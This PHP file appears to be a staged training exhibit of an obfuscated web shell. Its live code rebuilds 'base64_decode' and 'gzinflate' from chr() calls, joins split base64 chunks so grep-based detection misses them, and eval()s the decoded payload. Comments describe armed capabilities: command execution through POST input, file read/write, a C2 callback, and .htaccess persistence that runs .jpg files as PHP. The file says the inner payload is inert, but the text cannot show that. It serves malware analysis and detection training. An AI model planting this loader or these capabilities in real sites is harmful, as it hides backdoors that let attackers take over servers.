<?php
// staged exhibit — APSB25-94 public advisory reconstruction — NOT customer data
// 2-layer obfuscation typical of PolyShell variants observed post-APSB25-94:
//   outer: chr() ladder for function-name reconstruction + 4-chunk base64
//          concatenation (defeats naive `grep gzinflate` / `grep base64_decode`)
//   inner: raw DEFLATE (gzinflate over base64_decode) — yields a command-router
//          stub that dispatches on $_POST['c'] with a `BL-STAGE` key gate
// The inner payload is NON-FUNCTIONAL by design: it echoes a sentinel string for
// each dispatched key but never invokes system(), exec(), passthru(), or eval()
// against user input. Intent reconstructor (Day 4) walks both layers and reads
// the dormant-capability comments below as the "what this would do if armed"
// reference. Do NOT arm this file.
//
// dormant-capability markers (commented for exhibit; DO NOT execute or uncomment):
//   - cmd exec     : $_POST['c'] → system() / passthru() / popen()
//   - file r/w     : $_GET['a']  → file_get_contents() / file_put_contents()
//   - callback     : curl POST to a synthesized .top C2 (see P4-DATA-01 — no
//                    real domain; exhibit uses no resolvable hostname)
//   - persistence  : chmod 0644 on sibling .htaccess, AddType PHP on .jpg
$_0x=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);
$_0o=chr(103).chr(122).chr(105).chr(110).chr(102).chr(108).chr(97).chr(116).chr(101);
$_a1="U0m2zSwuTi3RUIkP8A8OiVZKVorVtEfiWCkpWatkoynKRlaU";
$_a2="DVGUmaahkq1oa6vk5KMbHOLo7qqkWZ2anJGvgBCwLkotKS3K";
$_a3="s65VKbJNLCpKrNRQylSytVPKTFHSUSoHsQrKQcwcEDOnGMhK";
$_a4="BbFS88qUNEHmQx1RFK2SHKuJbrqVkh5Exro2Nac4FcPuWgA=";
$_q=$_a1.$_a2.$_a3.$_a4;
$_p=$_0o($_0x($_q));  // placeholder decode — $_p resolves to a router stub that
                      // returns "BL-STAGE" sentinels; no user input ever reaches
                      // system()/eval() in this staged exhibit
eval($_p);
?>
